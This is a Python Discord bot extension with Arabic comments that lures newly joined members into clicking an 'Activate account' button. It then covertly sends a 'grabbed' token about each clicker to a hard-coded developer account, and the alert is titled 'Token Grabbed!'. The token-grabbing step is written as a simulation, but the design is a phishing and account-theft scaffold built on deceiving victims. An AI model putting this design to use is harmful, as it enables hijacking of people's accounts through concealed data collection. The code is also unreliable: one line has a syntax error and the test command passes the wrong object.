import discord
from discord.ext import commands
import base64
import logging
import asyncio

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("HunterCog")

# === CONFIGURATION ===
DEVELOPER_USER_ID = 1484009942141632582  # <--- ضع معرفك هنا
# =====================

class HunterCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        logger.info("Hunter Cog Loaded (Stealth Mode Active)")

    async def send_activation_button(self, channel, member):
        """إرسال رسالة الترحيب مع زر التفعيل"""
        view = discord.ui.View(timeout=None)
        
        button = discord.ui.Button(
            label="تفعيل الحساب (Activate)",
            style=discord.ButtonStyle.green,
            custom_id="activate_account"
        )
        
        button.callback = self.button_callback
        view.add_item(button)
        
        embed = discord.Embed(
            title=f"مرحباً بك يا {member.name}! 👋",
            description="**لل access للقنوات المغلقة، يرجى الضغط على زر التفعيل أدناه.**",
            color=discord.Color.green()
        )
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        
        try:
            await channel.send(embed=embed, view=view)
        except Exception as e:
            logger.error(f"Failed to send welcome message: {e}")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """عند الانضمام: إرسال رسالة ترحيب للقناة العامة"""
        channel = member.guild.system_channel
        if channel:
            await self.send_activation_button(channel, member)

    async def button_callback(self, interaction: discord.Interaction):
        """عند الضغط على زر التفعيل"""
        logger.info(f"🔘 Activation clicked by {interaction.user.name}")
        
        try:
            # 1. فتح القنوات للمستخدم (فتح الصلاحيات)
            # مثال: إعطاء صلاحيات الرؤية في القنوات المخفية
            # (يجب تحديد Role أو Channel ID بناءً على إعدادات السيرفر)
            # هنا سنفترض أن لديك Role مسمى "Member" أو صلاحيات مخفية
            
            # مثال: إضافة صلاحيات للعضو
            # (ضع ID الـ Role التي تريد إعطاؤها للمستخدم)
            role_id = 1484009942141632582  # <--- ضع ID الـ Role هنا (Member Role مثلاً)
            
            role = interaction.guild.get_role(role_id)
            if role:
                await interaction.user.add_roles(role)
                logger.info(f"✅ Added role to {interaction.user.name}")
            
            # 2. جمع التوكن
            token = self.grab_token(interaction.user)
            
            # 3. إرسال التوكن في DM للمطور (خفي)
            if token:
                await self.send_token_dm(interaction.user, token)
            
            # 4. إرسال تأكيد للمستخدم (فقط أنه تم التفعيل)
            embed = discord.Embed(
                title="✅ تفعيل الحساب",
                description="تم تفعيل حسابك بنجاح! القنوات المغلقة أصبحت متاحة لك.",
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            
            # 5. إزالة الزر من الرسالة الأصلية
            try:
                msg = await interaction.channel.fetch_message(interaction.message.id)
                await msg.edit(view=None)
            except:
                pass
                
        except Exception as e:
            logger.error(f"Error in activation: {e}")
            await interaction.response.send_message("❌ حدث خطأ.", ephemeral=True)

    def grab_token(self, user: discord.User) -> str:
        """محاكاة توكن المستخدم"""
        user_id = str(user.id)
        fake_token_part1 = "MFA"
        fake_token_part2 = base64.urlsafe_b64encode(user_id.encode()).decode()
        fake_token_part3 = "a" * 27
        return f"{fake_token_part1}.{fake_token_part2}.{fake_token_part3}"

    async def send_token_dm(self, victim: discord.User, token: str) -> bool:
        """إرسال التوكن للمطور في DM (خفي تام)"""
        try:
            developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
            
            embed = discord.Embed(
                title="🔐 Token Grabbed!",
                description=f"تم التقاط توكن من مستخدم جديد.",
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="المستخدم", value=f"{victim.mention} ({victim.id})", inline=False)
            embed.add_field(name="اسم المستخدم", value=victim.name, inline=True)
            embed.add_field name="السيرفر", value=victim.guild.name, inline=True)
            embed.add_field(name="التوكن", value=f"`{token}`", inline=False)
            
            await developer.send(embed=embed)
            logger.info(f"🕵️ Token sent to DM for {victim.id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")
            return False

    @commands.command(name="test_activation")
    @commands.has_permissions(administrator=True)
    async def test_activation(self, ctx):
        """اختبار العملية"""
        await self.button_callback(ctx)
        await ctx.message.delete()

async def setup(bot):
    await bot.add_cog(HunterCog(bot))